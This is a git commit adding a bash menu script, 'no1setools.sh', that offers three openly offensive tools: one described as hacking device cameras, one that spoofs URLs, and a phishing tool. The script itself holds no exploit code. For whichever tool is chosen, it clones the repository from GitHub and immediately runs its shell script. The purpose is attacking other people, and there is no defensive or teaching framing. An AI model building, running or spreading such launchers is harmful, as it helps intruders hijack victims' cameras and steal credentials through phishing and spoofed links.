fa0f85292c9160096bf77409400c74b8e0b6f608
NO1SE <98566890+no1se2@users.noreply.github.com>
2022-04-16 00:54:05 +0300

    Add files via upload

---
+++ no1setools.sh
@@ -0,0 +1,117 @@
+#!/bin/bash
+
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
+read -p "$MAGENTA Please Enter Your Name MY G:$RESETBG " Name
+
+clear
+
+#no1se logo
+echo -e "$MAGENTA  _   _  ___  _ ____  _____   _____ ___   ___  _     ____"
+sleep 0.3
+echo -e "$WHITE | \ | |/ _ \/ / ___|| ____| |_   _/ _ \ / _ \| |   / ___|"
+sleep 0.3
+echo -e "$MAGENTA |  \| | | | | \___ \|  _|     | || | | | | | | |   \___ /"
+sleep 0.3
+echo -e "$WHITE | |\  | |_| | |___) | |___    | || |_| | |_| | |___ ___)"
+sleep 0.3
+echo -e "$MAGENTA |_| \_|\___/|_|____/|_____|   |_| \___/ \___/|_____|____/"
+echo -e "$WHITE"
+
+sleep 0.5
+
+echo "              $WHITE Welcome to No1se-Tools ($Name)"
+#options
+echo ""
+
+start() {
+    echo "$RED Please Wait $Name im gonna clone the tool"
+    sleep 2
+    git clone https://github.com/no1se2/No1seCamTool
+    sleep 1
+    clear
+    echo "$GREEN No1seCamTool is installed on your system"
+    sleep 1
+    echo ""
+    echo "$WHITE im running the script now"
+    sleep 2
+    cd No1seCamTool
+    echo ""
+    echo "$RED Tool is gonna run NOW"
+    sleep 1
+    echo ""
+    clear
+    reset_color
+    bash No1seCamTool.sh
+}
+
+startt() {
+    echo "$RED Please Wait $Name im gonna clone the tool"
+    sleep 2
+    git clone https://github.com/no1se2/NO1SE-MASK
+    sleep 1
+    clear
+    echo "$GREEN NO1SE-MASK is installed on your system"
+    sleep 1
+    echo ""
+    echo "$WHITE im running the script now"
+    sleep 2
+    cd NO1SE-MASK
+    echo ""
+    echo "$RED Tool is gonna run NOW"
+    sleep 1
+    echo ""
+    clear
+    reset_color
+    bash No1se-Mask.sh
+}
+starttt() {
+    echo "$RED Please Wait $Name im gonna clone the tool"
+    sleep 2
+    git clone https://github.com/no1se2/No1se-phishing-Tool
+    sleep 1
+    clear
+    echo "$GREEN No1se-phishing-Tool is installed on your system"
+    sleep 1
+    echo ""
+    echo "$WHITE im running the script now"
+    sleep 2
+    cd No1se-phishing-Tool
+    echo ""
+    echo "$RED Tool is gonna run NOW"
+    sleep 1
+    echo ""
+    clear
+    reset_color
+    bash No1se-Phishing-Tool.sh
+}
+reset_color() {
+    tput sgr0
+    tput op
+   return
+}
+
+sleep 1
+	echo "${WHITE}1: No1seCamTool --  ${MAGENTA}Tool to Hack Device Camera"
+    echo "${WHITE}2: NO1SE-MASK --    ${MAGENTA}Tool to Spoof A URL/LINK"
+    echo "${WHITE}3: No1se-Phishing-Tool --  ${MAGENTA}Like it sound is phishing"
+    echo ""
+	read -p "${WHITE}($Name) Please Select ${MAGENTA} an option :$WHITE "
+    
+	case $REPLY in 
+		1 | 01)
+			start;;
+        2 | 2)
+            startt;;
+        3 | 3)
+            starttt;;
+		*)
+			echo -ne "\n${RED}Invalid Option, Run the script again please"
+			{ exit; };;
+esac
+
+
